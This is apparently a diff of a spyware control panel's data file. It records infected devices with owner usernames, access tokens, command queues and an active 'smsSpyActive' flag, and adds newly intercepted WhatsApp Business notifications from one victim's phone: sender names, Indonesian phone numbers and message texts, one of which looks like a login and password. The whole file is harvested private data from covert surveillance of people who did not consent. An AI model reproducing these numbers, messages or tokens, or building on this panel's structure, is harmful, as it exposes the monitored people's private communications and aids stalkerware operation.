@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776843197395,
+    "lastSeen": 1776843215383,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -1741,7 +1741,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "2d52258cb0a11a890ba41fac54cda5a3",
-    "lastSeen": 1776843197606,
+    "lastSeen": 1776843206717,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:30:01.375Z",
@@ -1757,6 +1757,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "My Bot Wangsaf",
+        "content": "dapet salam dari mantan",
+        "time": "22/04 14:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776843200381
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎5 pesan dari 3 chat",
+        "time": "22/04 14:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776843200370
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 895-3852-74875",
+        "content": "vangtg\nvan3109",
+        "time": "22/04 14:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776843200364
+      },
       {
         "appName": "WA Business",
         "sender": "+62 838-9814-0331",
